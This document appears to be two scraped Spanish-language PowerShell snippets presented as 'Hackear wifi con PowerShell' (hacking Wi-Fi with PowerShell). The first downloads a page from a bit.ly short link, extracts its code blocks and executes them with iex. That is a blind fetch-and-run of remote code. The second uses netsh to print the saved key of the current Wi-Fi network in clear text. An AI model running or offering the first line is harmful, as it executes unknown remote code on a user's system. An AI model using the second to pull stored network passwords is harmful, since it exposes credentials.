# Hackear wifi con PowerShell
## Network, PowerShell, Security, Wireless 
### URL: https://www.jesusninoc.com/2018/02/11/hackear-wifi-con-powershell-2/
```PowerShell
((iwr "http://bit.ly/2CbfGrg").AllElements | Where class -eq 'crayon-pre' | %{$_.innerText}) | iex

```
# Hackear wifi con PowerShell
## PowerShell, Wireless 
### URL: https://www.jesusninoc.com/2017/01/15/hackear-wifi-con-powershell/
```PowerShell
(netsh wlan show interface | Select-String SSID)[0] | %{
[String]$SSID=$_;
$SSID=$SSID.replace("SSID","").replace(":","").trim();
$SSID;
netsh wlan show profile name=$SSID key=clear | Select-String 'Contenido de la clave';
}

```
